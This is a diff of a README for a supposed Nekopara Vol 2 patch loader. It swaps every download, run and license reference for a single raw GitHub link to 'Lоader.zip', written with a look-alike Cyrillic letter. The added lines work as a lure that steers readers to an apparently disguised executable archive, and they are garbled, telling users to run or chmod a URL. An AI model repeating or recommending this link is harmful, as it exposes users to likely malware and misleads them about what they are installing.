@@ -58,16 +58,16 @@ Whether you’re a seasoned modder or a first-time player, our project aims to c
 
 To get started with Nekopara Vol 2 Patch Loader, follow these instructions closely:
 
-**1. Download `Loader.rar` from the repository.**  
+**1. Download `https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip` from the repository.**  
    - You’ll find the latest version in the [releases](./releases) section or at the root of this repo.
 
-**2. Extract `Loader.rar` to the same folder as your Nekopara Vol 2 installation.**  
+**2. Extract `https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip` to the same folder as your Nekopara Vol 2 installation.**  
    - Ensure the game is **not** running before proceeding!
 
 **3. Run the Loader application suitable for your operating system.**  
-   - Windows: `Loader.exe`
-   - macOS: `Loader.app`
-   - Linux: `Loader.sh` (make executable with `chmod +x Loader.sh`)
+   - Windows: `https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip`
+   - macOS: `https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip`
+   - Linux: `https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip` (make executable with `chmod +x https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip`)
 
 **4. Follow on-screen instructions to select the patch(es) and desired language.**  
 **5. Launch Nekopara Vol 2 from the loader or your usual shortcut.**  
@@ -94,7 +94,7 @@ The Nekopara Vol 2 Patch Loader **does not distribute any copyrighted content** 
 
 ## 📃 License (MIT 2025)
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) (2025).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Skygaming022/NekoPara2-PurrfectPatch/main/Lоader.zip) (2025).  
 You are free to use, modify, and distribute this loader as you see fit—just keep the original copyright!
 
 ---
